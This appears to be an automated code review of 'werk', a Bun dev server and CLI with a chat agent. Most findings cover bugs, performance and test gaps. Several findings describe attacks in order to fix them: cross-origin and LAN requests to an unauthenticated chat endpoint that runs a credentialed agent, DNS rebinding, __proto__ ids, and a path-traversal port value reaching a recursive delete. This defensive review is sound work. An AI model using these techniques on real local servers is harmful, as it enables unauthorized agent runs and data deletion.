review.impact: The request dispatch is `void liveServer()?.then(live => live.handler(...))`. If the handler throws (sync or async), nothing catches the error. The request hangs with no response, and Bun reports an unhandled rejection. That rejection can end the process. Under `bun --hot`, one bad edit to a handler module can then kill the server and every held child. The hot-reload guard exists to prevent exactly that.
review.fix: Wrap the dispatch: `.then(live => live.handler(req, res, live)).catch(error => { console.error(error); if (!res.headersSent) res.writeHead(500); res.end() })`. Add a test that loads a handler that throws and checks for a 500 and a live process.

review.impact: `appendEvents` reads and folds the log, assigns `seq = state.seq + 1`, and appends in a separate step. Nothing locks the log. Two writers at the same time (two CLI calls from agents, or the CLI and a later server write) both read seq N, and both write events with seq N+1. `seq` is documented as 'it only grows', and `changesSinceDecided` and the stale marks use it as the order key. A duplicate seq gives wrong 'changed since decided' results and wrong marks, and the append-only log keeps them for good.
review.fix: Put the read-check-append inside an exclusive lock, for example an `O_EXCL` lock file next to the log with retry. Or derive `seq` from the line position at fold time and do not store it. Document the single-writer assumption if the lock is deferred.

review.impact: The fold sends each bad event to `problems` so that 'one bad line does not hide the rest of the map'. But `readLog` throws on a line that is not JSON, so one corrupt line hides the whole map in `show`, in every write command, and in `/api/map`. A line that is valid JSON but not an object (`null`, `42`) passes `readLog` and then crashes `check` with a TypeError on `event.type`. In `cli.ts`, `show` and `write` do not catch either error, so the user sees a raw stack trace, not a `werk:` message.
review.fix: Make `readLog` return a problem entry for a line that does not parse, or that is not an object with a `type` and a numeric `seq`, and let the fold carry it on in `problems`. Also catch errors in `cli.ts` and print `werk: <message>` with exit code 1.

review.impact: `stop` calls `void vite.close()` and `server.close()`, then calls `process.exit(0)` at once. Neither close gets a chance to finish, so the close calls do nothing. A future cleanup step added there (for example, flushing a write) gets skipped without any error.
review.fix: Await the shutdown: `await Promise.allSettled([vite.close(), new Promise(r => server.close(r))])`, then exit. Or remove the close calls and say that exit is the cleanup.

review.impact: `holdChild` is production code that only `test/hot-entry.ts` calls. No server path starts a child, so nothing exercises this code in production. The hot-reload test proves a behaviour that the product does not use.
review.fix: Move `holdChild` into the test helpers until a real caller (the chat agent) exists. Or add the real caller in the same change. Keep `childSummary` and `stopChildren` in `src/server`, because the server uses them.

review.impact: Nothing passes the `from` option of `makeProject`, and nothing passes `git: false`. The code for both options is dead and has no test.
review.fix: Delete `from` and `git` from `ProjectOptions`. Delete their branches in `makeProject`, and always run the git setup.

review.impact: `JSON.stringify` without indent never puts a raw newline in its output. So `split('\n')` always gives one line, and the multi-line branch is dead. The test 'a value with a newline still fits on data lines' does not exercise a split.

The check `if (id === undefined) return 'unknown event type'` inside the id loop duplicates the `default` branch of the switch below it. It also depends on an implementation detail of `eventIds` for an untyped event. There are two places for one rule.
review.fix: Before the id loop, reject an event whose type is not a known event type, with one check. Then remove the `id === undefined` branch, or the `default` branch.

review.impact: `parseArgs` validates `--kind` against `KINDS` and `--type` against `LINK_TYPES`. `check()` in fold.ts validates the same values again before every append. The two error messages are different, so a later change to one rule can leave the other rule out of step.

review.impact: `Detail` types its prop as `NonNullable<ReturnType<typeof pageOf>>`, but `view.ts` already exports `Page`. The status label expression `card.kind === 'card' ? card.status : card.kind` is also duplicated at lines 79 and 180.

review.impact: `.catch(() => {})` silently drops a failed `/api/project` request. The page then shows the fallback name 'werk', and nothing reports the error.

review.impact: The test says a refused write 'leaves the log as it was', but it only checks the root page's children. The refused link comes from an option, and an option never shows on the root. review.impact: `werk show` adds `problems` to the root page and `changedSinceDecided` to a card page, but no test checks either field. Someone could drop or rename a field, or call `describeEvent` wrong, and every test would still pass. `changesSinceDecided` has unit tests only at the fold level.

review.impact: The test title says removed cards 'come back on restore', but the test never folds a `restored` event. A broken restore in `isVisible` or `pageOf` would not fail it.

review.impact: No test reaches the 500 branch of `/api/map`, where a log line is not JSON. The App test fakes the `{ error }` body on the client side only, so nobody checks that the server sends that shape and status.

review.impact: The map keeps cards in a plain object (`cards: {}`), and the user supplies the card ids. Inherited keys pass the existence check. I ran these commands to confirm it. `werk add constructor --title C` fails with "#constructor already exists". `werk link a toString --type depends_on` passes the check and appends a dangling `depends_on` edge to the append-only log, where it stays. The log is append-only, so no command can remove the bad line. A `__proto__` id in a hand-edited or merged log line sets the prototype of the cards object (`next.cards[event.id] = ...`) and does not add a card.
review.fix: Hold cards in a `Map<string, Card>`, or create the object with `Object.create(null)` and test with `Object.hasOwn(state.cards, id)`. Add a test that `add constructor`, `add __proto__` and `link a toString` behave like any other new or missing id.

review.impact: `server.listen(port, cb)` has no host, so the server listens on all network interfaces. Any machine on the same network can read the whole project map from `/api/map`, the project name, and the live channel. It can also read the Vite dev middleware, which serves the client source. The `/api/*` routes run before Vite, so Vite's host check does not cover them. A DNS-rebinding page in the user's browser can therefore read `/api/map`.
review.fix: Listen on loopback by default: `server.listen(port, '127.0.0.1', ...)`. Use an explicit flag if remote access is ever needed. In the handler, reject a request whose `Host` header is not `localhost`, `127.0.0.1` or `[::1]` (with the port) before the `/api/` routes run.

review.impact: `applyEvent` copies the whole `cards` object on every event. It also copies the whole `links` array on every `linked` event (line 82). `fold` calls `applyEvent` once per event, so a fold costs O(events × cards) plus O(events × links). The log is append-only and only grows. Every `show`, every write command (in `appendEvents`) and every `/api/map` request folds the whole log again. A benchmark with a synthetic log measured 51 ms at 4k events, 184 ms at 8k events and 779 ms at 16k events. That is quadratic growth. The repository's own `.werk/log.jsonl` already has about 7.8k lines.
review.fix: Let `fold` own one mutable state. Create it once, and let each event change it in place: assign `cards[id]` and push to `links`. Keep a copying wrapper only where the caller needs the old state to stay unchanged. `appendEvents` is that caller, and it can copy once per batch, not once per event. Then a fold is linear in the number of events.

review.impact: Each `retitled`, `edited` and `reopened` event makes `markChanged` scan every link. Each `linked` event makes `checkLink` scan every link at least once (`some`, lines 177/179/185). For `refines`, `ancestors` → `parentOf` adds one more full scan per level of depth. So the fold has a second quadratic term, O(events × links), and it remains after the copying in the finding above is fixed.
review.fix: Keep two indexes in the fold state: links by target id, and the `refines` parent by card id. Update both when a link is added. `markChanged` then reads only the links into the changed card. The duplicate check and `parentOf` become map lookups.

review.impact: `werk show <id>` folds the whole log twice. It folds once at line 21, and `changesSinceDecided` folds it again inside, at fold.ts:210. Because the fold is quadratic, this doubles the cost of every card `show`.
review.fix: Pass the map that is already folded into `changesSinceDecided`, for example `changesSinceDecided(events, map, id)`. Then the function does not fold again.

review.impact: When the chat agent exits or crashes, nothing goes to the live channel. Its next turn starts a new `claude` child with a fresh session. The client is not told that the earlier conversation context is gone. An agent error goes only to the server's stderr.
review.fix: In the spawn branch, add an `exit` listener that writes an `agent` event (for example `{type: 'exit', code, signal}`) to every live client. Also send the `error` event to the clients, not only to console.error.

review.impact: `sendTurn` reads `live.children` and runs `isRunning` itself. Then `holdChild` runs the same check again. Two modules now own the get-or-spawn rule. The cast to `ChildProcessWithoutNullStreams` depends on a child that some other code could hold under the name 'chat'.
review.fix: Let `holdChild` be the only get-or-spawn point. For example, give it an `onSpawn(child)` callback that attaches the listeners and the relay once, or have it return `{ child, spawned }`. Then remove the duplicate lookup from `sendTurn`.

review.impact: `changedModules` only builds a log line, but it walks `src` and calls `statSync` on each file. A file deleted between `readdirSync` and `statSync` throws ENOENT. The reload path of `startServer` then rejects after the handler swap, so a cosmetic log line can fail the reload.
review.fix: Wrap the `changedModules` call in try/catch and fall back to 'the server modules'. Or skip files that `statSync` cannot read inside `changedModules`.

review.impact: The relay drops `buffered` when stdout ends. A last line from the agent with no trailing newline never reaches the live channel.
review.fix: On the `end` event of `agent.stdout`, send any non-empty `buffered` content through the same parse-and-broadcast path.

review.impact: `WERK_ROOT` is now computed in a third place: `test/env.ts`, here, and in the form of `CLIENT_ROOT` in `client.ts`. Each copy uses its own relative-path arithmetic, and the copies can drift.
review.fix: Export one werk-root constant from a small `src` module, and derive `CLIENT_ROOT` and the reload root from it.

review.impact: The code that splits stdout into JSON lines, with a buffer for the partial last line, is now in two places. One copy is in `relay` and one is in the stream-json branch of `v0/test/fake-agent/fake-agent.ts`. A fix to one copy, for example for CRLF or a trailing line at close, does not reach the other copy.
review.fix: Move the code into one small helper, for example `onLines(stream, fn)`. Call the helper from `relay` and from the fake agent. If the fake agent must stay separate from the server code, accept the copy, but `relay` still gets the helper so that it is testable alone.

review.impact: `sendTurn` checks `isRunning` before it calls `holdChild`, and `holdChild` checks it again. The function also casts to `ChildProcessWithoutNullStreams` two times. The code that decides when a child is reused is in two places, and the casts hide the stdio type from the compiler.
review.fix: Let `holdChild` tell the caller if it spawned a new child, for example with an `onSpawn` callback or a `{ child, fresh }` result. Then `sendTurn` attaches its listeners only when the child is new. Give `holdChild` an overload that returns `ChildProcessWithoutNullStreams` when `stdio: 'pipe'`, so that one cast is enough.

review.impact: The test writes the stream-json argv list out again instead of using the exported `CHAT_ARGS`. When a flag changes, the test fails, but the reason is the copy, not the behaviour.
review.fix: Import `CHAT_ARGS` and write `expect(lines).toEqual([{ argv: [...CHAT_ARGS], cwd: project.dir }])`.

review.impact: The new `argv` constant repeats `process.argv.slice(2)`, and the `calls` line above still uses the old expression. Two names now hold one value.
review.fix: Declare `argv` before the `calls` line and use `argv` in the `appendFileSync` call.

review.impact: `expect(reuse[0]).toBeDefined()` asserts nothing, because `waitFor` already resolved on that match. The next `toMatch` on `server.output()` checks the same line a second time. This is test noise.
review.fix: Delete the `reuse` variable and the `toBeDefined` assertion. Use `await server.waitFor(/reusing the live server on port \d+ \(pid \d+\); not listening again/)` in place of the `REUSE` wait and the `toMatch` check.

review.impact: No test covers the relay's two edge cases. The first is a JSON line split across two stdout chunks, which the `buffered` carry-over handles. The second is a non-JSON line that falls back to `{ type: 'text', text: line }`. The fake agent writes each event in one `write` call, and every event is valid JSON. A regression could drop the carry-over, emit half lines, or remove the fallback, which lets one bad line throw inside the `data` handler. No test would fail.
review.fix: Add a test that starts serve with a `WERK_FAKE_SCRIPT` or a fake-agent mode. The fake must print one event in two writes with a sleep between them, then print one plain-text line. Assert that the live channel gets one whole `agent` event for the split line and one `{"type":"text","text":...}` event for the plain line.

review.impact: `expect(reuse[0]).toBeDefined()` cannot fail, because `waitFor(REUSE)` resolves only on a match. The test does not check the port or pid that the REUSE regex captures, so a wrong port or pid in the reload message still passes.
review.fix: Assert the captures: `expect(Number(reuse[1])).toBe(server.port)` and `expect(Number(reuse[2])).toBe(serverPid)`.

review.impact: The 'every turn goes to the one stream-json agent child' test checks the pid and the argv. It does not check that either turn reaches the agent's stdin or that a reply arrives. If `sendTurn` stops writing to stdin, or writes a wrong message shape, this unit test still passes. Only the slower hot-reload e2e test would catch it.
review.fix: Open `/api/live` before the POST requests. Assert that `agent` events with `"result":"one"` and `"result":"two"` arrive. To do this, move the `chat` helper from hot.test.ts into the test harness and reuse it.

review.impact: `POST /api/chat` has no authentication and no Origin check. The server also listens on all interfaces, because `server.listen(port)` gets no host. Two attackers can use it. (1) Any web page that the user opens can send a cross-origin `fetch` to `http://localhost:<port>/api/chat` with a `text/plain` body. This is a simple request, so no preflight runs. `JSON.parse` accepts the body, and the server starts a `claude` agent in the project directory with the user's credentials and the attacker's prompt. (2) Any host on the same network can do the same. It can also read the agent's replies on `GET /api/live`, which can include project file contents. The agent can use every tool that the project settings allow without a prompt, and each turn costs the user tokens.
review.fix: Bind the server to `127.0.0.1` (`server.listen(port, '127.0.0.1', ...)`). In `postChat`, refuse the request with 403 when an `Origin` header is present and is not `http://localhost:<port>` or `http://127.0.0.1:<port>`. Also require `Content-Type: application/json`, so that a cross-origin request must pass a CORS preflight, which the server never grants. Add a test for each refusal. If the network or browser case must stay open, add a per-boot random token that the client must send.

review.impact: `readBody` reads the whole request body into memory with no size limit, and `text` has no length limit. A large POST can use up the server's memory. The server process also holds the live channel and the chat agent child.
review.fix: Stop reading after a fixed limit, for example 1 MB. Destroy the request and answer with 413 when the body is larger.

review.impact: `sseEvent('agent', event)` runs inside the client loop. It serializes the same event once per open live channel. Each agent line costs one JSON.stringify per connected client.
review.fix: Build the frame once before the loop: `const frame = sseEvent('agent', event); for (const client of live.clients) client.write(frame)`.

review.impact: Each stdout chunk adds to `buffered`, and `buffered.split('\n')` runs again over the whole buffer. A long line with no newline, such as a large tool result, gets rescanned once per chunk. The cost grows with the square of the line length.
review.fix: Look for '\n' only in the new chunk. If the chunk has no newline, append it and return. Or keep the partial parts in an array and join them once a newline arrives.

review.impact: `readBody` reads the whole request body into one string with no size limit, and string concatenation adds to the cost. A large POST to /api/chat fills memory before the JSON check runs.
review.fix: Set a byte cap, for example 1 MB. Return 413 when the body is larger. Collect the chunks as Buffers and decode them once at the end.

grade.gap: v0 is built as the v0/ subdirectory of the prototype repository, not in a new, empty repository of its own. The diff stat shows every path under v0/ next to the prototype's src/. This diff does not make that worse, and it ports no prototype code.

No test shows that the new log watcher survives a hot reload of the server module. v0/src/server/start.ts creates the watcher inside boot() and keeps it on the Live state, so the guard covers it, but no test edits a source file under --hot and then checks that one 'changed' still arrives. Add one to v0/src/cli.test.ts or the harness.

review.impact: When the watcher errors (for example, the .werk directory is removed and created again), the code writes one line to stderr and stops watching. It does not start a new watcher, and it does not tell the open pages. The server keeps running, but every open page stops redrawing and shows nothing to say it stopped.
review.fix: When the watcher errors, close it and start a new watch on the directory after `mkdirSync`. Or send an event on the live channel that tells the page to show that live updates stopped.

review.impact: One `appendFileSync` often causes two or more `fs.watch` events on macOS and Linux. Each event sends `changed` to every client, and each `changed` makes every page fetch the whole map again. A burst of CLI writes then causes several full refolds for each write.
review.fix: Debounce `onChange` in `watchLog` by a short time, for example 50 ms, so that a burst of events sends one `changed`.

review.impact: `watchLog` calls `mkdirSync(.werk)` when `serve` starts. A read-only command now creates a directory in the user's project, even when nobody writes a card. This is outside the job of a watcher, and it conflicts with the README rule that the command line is the only write path.
review.fix: Watch the project directory until `.werk` exists, then move the watch to `.werk`. Or document that `serve` creates `.werk`.

review.impact: The page calls `load()` on mount and again on the first `hello` event of the live channel. So every page load fetches and folds `/api/map` two times.
review.fix: Ignore the first `hello` event, because the mount fetch already covers it. Or remove the direct `load()` call and let `hello` start the first fetch.

review.impact: `check` for an `added` event with a parent creates a temporary state with `newCard`. It then calls `checkLink` on that state. This repeats part of what `applyEvent` does, so the validation path and the apply path for the same event can drift apart.
review.fix: Validate with `checkLink(applyEvent-like placed state)` from one shared helper that both `check` and `applyEvent` use. Or give `checkLink` the kind of the new card directly, so it does not need a placed state.

review.impact: `openLive` copies the stream-reading loop and the `data:` line parsing from `liveHello` (lines 137-157). The two SSE parsers can drift apart. One already differs: `liveHello` breaks when the stream ends, and `openLive` throws.
review.fix: Write `liveHello` as `const live = await openLive(port); try { return (await live.next('hello')).data } finally { live.close() }`. Then delete its own reader and parser.

review.impact: The code writes `Live.logWatcher` but never reads it. `stop()` in start.ts closes the local `logWatcher` variable, not `state.logWatcher`. The field is dead, and a reader can think that something else closes or reuses the watcher on a reload.
review.fix: Remove the field from `Live` and from the state object in start.ts. As an alternative, make `stop()` call `state.logWatcher.close()`, so that the field has one reader.

review.impact: The timeout error text `no ${event} event on the live channel in ${timeoutMs} ms` occurs twice, once for the deadline check and once for the timer. Each loop pass also makes a new timer and a new `Promise.race`. A `read()` that loses the race keeps a pending `reader.read()`.
review.fix: Make one deadline timer before the loop. Race the whole loop that reads and filters events against that timer, with the message in one place.

review.impact: `status` makes the `decided` and `reopened` event objects again, in place of the `decide` and `reopen` builders. If one of these events gets a new field, someone must change both places.
review.fix: Make `status` call `WRITES.decide.build({ args: [id], flags: {} })` and `WRITES.reopen.build(...)`. As an alternative, move the two event constructors into small shared functions.

review.impact: The test 'a removed log directory does not throw from the watcher' has no assertion. It passes even if the error handler logs nothing or the code removes it, so the test name claims a behaviour that the test does not check.
review.fix: Spy on `console.error` (or on the watcher's `error` event). Then assert that the error is handled, or assert that the process gets no uncaught exception.

review.impact: The guard that drops an older `/api/map` answer when a newer one arrives first (`mine !== latest`) has no test. The App tests resolve every fetch at once and in order. If someone removes the guard, every test still passes, and a slow older fold can draw over a newer one after two quick `changed` events.
review.fix: Add an App test with a fetch stub that holds the first `/api/map` promise. Fire `changed` and resolve the second fetch with a newer map. Then resolve the first fetch with the old map. Assert that the page still shows the newer title.

review.impact: In 'each append to the log is seen', the watcher can deliver the first append's event after the 100 ms sleep, which is common with macOS FSEvents. That late event consumes the `nextCall` resolver, so the test passes even when the second append is never seen. The test can pass falsely and can also be flaky.
review.fix: Wait for the first change with `await nextCall(calls)` before the second append, not with a fixed sleep. Or count the callbacks and assert the count after the second append.

review.impact: Nothing tests `setError(undefined)` on a later good fetch. After one failed load, the page stays on the alert. If a refactor drops the reset, the page shows 'The map did not load' forever, even after a `changed` brings a good fold, and no test catches it.
review.fix: Add an App test: the first `/api/map` returns `{ error: 'x' }` and the alert shows. Then serve a good map and fire `changed`. Assert that the alert is gone and the card heading shows.

review.impact: 'a removed log directory does not throw from the watcher' has no assertion. It sleeps for 100 ms and ends. If the `error` listener is removed, bun can report the unhandled error after the test ends or in a different test, so this test does not show the behaviour it names.
review.fix: Spy on `console.error`, or attach a second `error` listener. Assert that the watcher emitted or logged the error, or that the server-style callback did not throw. Also wait for the event instead of a fixed sleep.

review.impact: The command-line test for one event per command has no failing case for `add --parent`. The refusal of a missing parent is tested only at the log layer. No test shows that the command exits 1 and leaves the log unchanged when the parent does not exist, or when the parent is an option.
review.fix: Add `['add', 'x', '--title', 'X', '--parent', 'missing']` to the 'a write the map refuses exits 1' test. Assert code 1, the 'no card #missing' message, and an unchanged log.

review.impact: The script builds the directory to delete from `process.argv[2]` with no check: `rmSync(fixtureRoot(port), { recursive: true, force: true })`. A port argument that holds path segments, such as `x/../../..`, makes `join` resolve outside the temporary directory. The script then deletes that directory tree recursively. The path is also predictable (`werk-e2e-<port>`). On a system where the temporary directory is shared, another local user can create that path before the run. Today only the Playwright config calls the script, with a fixed port, so the risk is low.
review.fix: Check the port before use and exit when it is not a number: `if (!/^\d+$/.test(port)) throw new Error(...)`. Also make the check in `fixtureRoot` in `e2e/fixture.ts`, so that every caller gets it.

review.impact: The watcher calls `onChange` once for every raw `fs.watch` event and does not merge them. On macOS and Linux, one append often gives two or more events, such as 'rename' and 'change'. A run of agent writes gives many events. Each event sends `changed` to every live client. Each client then fetches `/api/map`, and the server reads and folds the whole log again for every request (`readMap` in `app.ts`). The cost grows as writes × clients × log length. The guard in `App.tsx` drops old responses, but the server still does all the work.
review.fix: Debounce or merge the events in `watchLog`. For example, set a pending flag and call `onChange` once on the next `setTimeout(…, 50)`. Then one write burst sends one `changed`. On the server, it is also possible to cache the folded map by log size and mtime, so that the parallel `/api/map` requests fold only one time.

review.impact: On each page load, the page fetches the full map two times. It calls `load()` directly, and the server sends `hello` as soon as the live channel connects, and `hello` also calls `load`. The server folds the whole log two times for each page open.
review.fix: Do not run the `hello` handler on the first connection. Run it only on a reconnect, for example by skipping the first `hello`. Another way is to remove the direct `load()` call and let the first `hello` start the first fetch.

causeOfLast.why: The ticket asked for a server that runs a credentialed agent, and pass 1 left its chat route open to any origin and any network host.

grade.gap: The diff stays inside the clean v0 tree (v0/src/server/chat.ts, local.ts, reload.ts). It ports no prototype file. It does not touch the React + Vite client build, so this card gets no new evidence in this pass.

The diff touches only the server. Vite still runs as middleware: app.ts passes every route that is not /api/ to live.vite.middlewares. Nothing in the diff weakens the stack, and nothing in it adds to the stack.

bun test passes: 117 tests, 0 failures. The new local.ts is a pure module, and the diff adds it to tools/pure-files.ts for the 90% gate. The diff does not show that `bun run test:coverage` passes with local.ts in the gate. No e2e test covers the chat endpoint or a reload in a real browser. hot.test.ts covers a reload of the server process only.

The diff changes no client code. It adds a Host check to every request in app.ts handle(). A client route like /card/<id> now needs Host localhost:<port> or 127.0.0.1:<port>. No test shows that a deep card URL still loads after a reload under the new Host check. chat.test.ts checks only '/', /api/live and /api/map. Add a test: a GET of a card URL on localhost returns 200.

The diff keeps one Bun process, with Vite in middleware mode for the client. The new hot.test.ts test proves that a server module edit keeps the chat agent child and the live channel. No test proves that React Fast Refresh keeps component state on a client edit. That is the criterion that decided this card.
The diff does not touch how a card shows say, ev and alt. Nothing in the diff goes against this card, and nothing adds to it.
The diff does not touch link types. Nothing in the diff goes against this card, and nothing adds to it.

The diff does not touch how an edit changes a card in place. The chat agent can now edit cards, but no test shows that a card edit during a turn reaches an open map as a change in place. app.ts sends agent events on the live channel, but it sends no map-change event.
/api/map still serves the fold of the log through readMap (app.ts sendMap). The diff does not change the log or the fold.

review.impact: When the chat agent exits or crashes, no event reaches the live channel. The page waits for a reply that never comes. The next turn starts a new `claude` child without its earlier conversation, and the client gets no sign that the session was lost.
review.fix: In sendTurn, listen for 'exit' on a newly started agent. Send an `agent` event (or a separate `agent-exit` event) with the exit code or signal to every live client, so the page can show that the session ended.

review.impact: The cast to ChildProcessWithoutNullStreams is unchecked. holdChild defaults to stdio 'ignore', and any other caller can hold a child under the name 'chat'. If one does, `agent.stdin.write` throws a TypeError, and postChat turns it into a misleading 502.
review.fix: Keep the chat child's stdio contract inside chat.ts. Before the cast, check that `agent.stdin` and `agent.stdout` exist, or give holdChild a typed overload for stdio 'pipe' that returns ChildProcessWithoutNullStreams.

review.impact: If the client aborts while readBody runs, the rejection lands in the same catch as JSON.parse. The handler then answers 400 'the body must be JSON' to a closed socket, and a stream error is reported as bad input.
review.fix: Read the body outside the JSON.parse try block, or catch read errors on their own and end the response without a JSON error. Keep the 400 only for a parse failure.

review.impact: The rule for which files reload the server (no tests, no `src/client/`) is hard-coded here by path. If a new non-server directory is added under src, the reload message names files that the server never loaded.
review.fix: Put the excluded directories in one named constant next to the client server setup, or take the server module list from the module graph. Then the rule lives in one place.

review.impact: When stdout ends, any text after the last newline stays in `buffered` and is never sent. The last partial line from a crashing agent is lost.
review.fix: On `agent.stdout` 'end', send what is left in `buffered` as one more `agent` event if it is not empty.

review.impact: `sendTurn` repeats the running-child check that `holdChild` already does. It needs the check only to learn whether `holdChild` started a new child, so it knows when to attach listeners. It also casts the result twice to `ChildProcessWithoutNullStreams`. If the reuse rule in `holdChild` changes, the copy in `sendTurn` can drift from it. Then listeners attach twice, or never.
review.fix: Let `holdChild` report whether it started the child, for example `{ child, started }` or an `onStart(child)` callback. Attach the listeners and `relay` only on start, and delete the separate `isRunning` check in `sendTurn`.

review.impact: `WERK_ROOT` is now defined twice: here and in `test/env.ts`, which builds the same path in a different way. Two definitions of the werk root can go out of step if the layout changes.
review.fix: Export one werk-root constant from a module under `src/`, next to `CLIENT_ROOT` in `src/server/client.ts`. Make `test/env.ts` re-export it or derive from it.

review.impact: `expect(reuse[0]).toBeDefined()` and the `toMatch` on `server.output()` that follows it repeat what `server.waitFor(REUSE)` already proved. This is three assertions for one fact, and it adds noise to the test.
review.fix: Keep one check. Put the full line, including `; not listening again`, into the `waitFor` pattern, and delete the other two assertions.

review.impact: The fake agent copies the code that buffers chunks and splits them into lines from `relay` in `src/server/chat.ts`. A fix to how one of them handles a partial line will not reach the other.
review.fix: Move the line splitter into a small pure helper, for example `splitLines(buffer, chunk) -> { lines, rest }`. Use it from both places, and add it to `PURE_FILES`.

review.impact: No test covers the respawn branch, where the held chat child has exited and the next turn must start a new one. A regression there has no failing test. For example, the code could write to a dead child's stdin, or keep a stale entry in `live.children` after the child exits. The README promises that the agent is reused, but it does not say what happens after the agent dies.
review.fix: Add a test to chat.test.ts. Send one turn and kill the returned pid. Wait until `liveHello` lists no `chat` child. Send a second turn. Assert status 200, a new pid, `children` equal to `[{ name: 'chat', pid: <new> }]`, and two lines in `WERK_FAKE_CALLS`.

review.impact: No test covers two `relay` paths. The first path is the fallback that wraps a non-JSON stdout line as `{ type: 'text', text }`. The second path is a line split across two stdout chunks. If either path breaks, the live channel drops a line or sends a broken event, and no test fails.
review.fix: Use a `WERK_FAKE_SCRIPT` or a small fake that prints one plain-text line and one JSON line in two separate writes. Assert that the live channel gets one `agent` event with `{"type":"text",...}` and one event with the whole JSON object.

review.impact: `expect(reuse[0]).toBeDefined()` cannot fail, because `waitFor` throws or times out before it returns a match. The assertion adds noise, and it does not check the port or the pid that the regex captures.
review.fix: Assert the captured groups: `expect(Number(reuse[1])).toBe(server.port)` and `expect(Number(reuse[2])).toBe(serverPid)`.

review.impact: The accepted-origin test checks only the HTTP status. It does not check that a turn from a page werk served starts the agent. A handler that returned 200 without a call to `sendTurn` would still pass.
review.fix: Also assert that the body has a numeric `pid`, and that `liveHello(...).children` equals `[{ name: 'chat', pid }]`.

review.impact: `readBody` reads the whole request body into memory with no size limit. Only a local process or a page that werk served can reach `POST /api/chat`, so the risk is small. A large or endless body still grows the server's memory without bound before the code parses it.
review.fix: Cap the body at a fixed size, for example 1 MB. Count the bytes as chunks arrive. Above the cap, stop reading and answer 413. A `Content-Length` header above the cap can get 413 at once.

review.impact: readBody keeps every chunk of the request body in memory and has no size limit. A chat turn only needs a short text, but a large or endless POST body grows the server's heap without bound before JSON.parse runs.
review.fix: Keep a running byte count. Stop reading and answer 413 when the body passes a small cap, for example 1 MB.

review.impact: relay adds stdout chunks to `buffered` until it sees a newline. One long agent line, or output with no newline, grows the buffer without limit. Each new chunk also runs split over the whole buffer again, so the cost is quadratic in the line length.
review.fix: Search for '\n' only in the new chunk before you split. Set a maximum line length, and flush or drop a line that goes past it.

review.impact: The code calls sseEvent('agent', event) once for each open client, so each agent line is serialized N times. A streaming reply has many lines, so the JSON.stringify work grows with the number of clients.
review.fix: Call sseEvent once for each line, before the client loop, and write the same string to every client.

causeOfLast.why: werk/02 merged after werk/28 was built, and both changed the import block of `start.ts`. Neither side's code was wrong.

grade.gap: The diff stays inside v0/ and copies no prototype code. The chat child, the reload report and the localhost guard are new code written for v0.

The diff does not touch the client stack. React and Vite still run as middleware inside the Bun server (src/server/app.ts falls through to live.vite.middlewares). The card is unchanged and not regressed.

`bun test` and `bun run test:coverage` pass: 137 tests, and the 90% gate passes with src/server/local.ts added to PURE_FILES. src/server/reload.ts and src/server/chat.ts are I/O modules. Their behaviour lists are named tests in reload.test.ts and chat.test.ts. No e2e spec drives the new chat route, and `bun run e2e` was not run for this pass. A builder could add one Playwright check: a POST to /api/chat from the served page gives an `agent` event on /api/live.

The diff does not touch the card page. src/client/CardPage.tsx and the hash route in src/client/App.tsx from earlier passes stay as they were. The new Host check in src/server/app.ts refuses any Host other than localhost:<port> or 127.0.0.1:<port>. A shared URL that uses another hostname for the same machine now gets 403. The card does not require that case.

The diff does not change React or Vite. Vite still runs in middleware mode inside the one Bun process (createClientServer(server) in src/server/start.ts). The diff has no test that a client edit hot-reloads with Fast Refresh and keeps state while the new chat child is alive.

The diff does not touch the proof sections. CardPage.tsx still renders says, sources and options from earlier passes. Agent events now reach the live channel, but nothing records a chat turn as a `say` excerpt on a card. The card does not demand that from this server pass.
The diff does not change the four link types or their fold. src/map/fold.ts and src/map/view.ts are unchanged and stay at 100% coverage.
The diff does not change edit-in-place. The fold still shows only the current state. This diff adds no test for it.

The /api/map route still sends the fold of .werk/log.jsonl. The new hot.test.ts case 'after a hot reload, an append to the log still reaches an open live channel' shows that the log watcher survives a reload. The diff does not change the event model.

review.impact: `changedModules` calls `statSync` on every path that `readdirSync` returned, with no error handling. Many editors save a file by writing a temporary `.ts` file and renaming it. If one of those files disappears between the directory read and the `statSync`, the call throws ENOENT. On a hot reload, `startServer` has already swapped in the new handler, so the throw rejects the top-level `await startServer` in cli.ts. The 'reloaded' and 'reusing the live server' lines never print, and the process gets an unhandled rejection. All of this comes from code that only produces a log line.
review.fix: Make `changedModules` skip a file that `statSync` cannot read (try/catch per path, or `statSync(path, { throwIfNoEntry: false })`). As an extra guard, wrap the call in start.ts so that a failure falls back to 'the server modules'.

review.impact: `sendTurn` repeats the 'is it running' check that `holdChild` already makes. It needs the check only to know if a new child was spawned and still needs listeners. It also casts the `ChildProcess` that `holdChild` returns to `ChildProcessWithoutNullStreams` with no check. The two modules share an invariant that neither one states: listeners must be attached exactly once per spawn. A later change to the reuse rule in `holdChild` can then attach duplicate relays, or none.
review.fix: Let `holdChild` tell the caller that it started a new child. For example, give it an `onStart(child)` callback or return `{ child, started }`. Then `sendTurn` attaches the error, stderr and relay listeners only in that callback and does not check `isRunning` again.

review.impact: The stdout relay is a closure from the module evaluation that spawned the agent. After a hot reload, the agent's output still goes through the old `relay` code. An edit to the relay or to the shape of the `agent` event does not apply until the agent restarts. This works against the hot-reload contract that start.ts describes.
review.fix: Put a broadcast function on `Live` (swapped on reload, like `handler`). Make the stdout listener call `live.broadcast(...)` (or a parse function swapped through `live`), so that the latest evaluation's code handles each line.

review.impact: `readBody` buffers the whole request body with no size limit before `JSON.parse`. Any local client can make the server hold an arbitrarily large string in memory for one chat turn.
review.fix: Stop reading after a fixed limit (for example 1 MB) and answer 413. Alternatively, reject a `Content-Length` above the limit before reading.

review.impact: The `chat` helper writes its own SSE reader with a fetch, a reader, a decoder and an abort controller. The harness already exports `openLive` with the same reader. The new reader also has no timeout: if the reply never comes, the test hangs until the 60 s limit and gives no clear message. There are now two SSE readers to keep in step.
review.fix: Use `openLive(port)` from the harness. Call `live.next('agent')` in a loop until `data.result === text`, then call `live.close()` in `finally`. Move the POST helper into `test/harness.ts` so that chat.test.ts `post` and hot.test.ts `chat` share it.

review.impact: `process.argv.slice(2)` is computed twice: once inline for the WERK_FAKE_CALLS line and once as `argv`. The two copies can drift.
review.fix: Declare `const argv = process.argv.slice(2)` before the calls append and use it in both places.

review.impact: The newline-buffered line splitter (`buffered += chunk; split('\n'); lines.pop()!; filter(Boolean)`) appears twice: in `relay` and in the fake agent's stdin loop. It also matches the line handling elsewhere in the harness. A fix to one copy, such as a CRLF fix or a flush of the last line on end, does not reach the others.
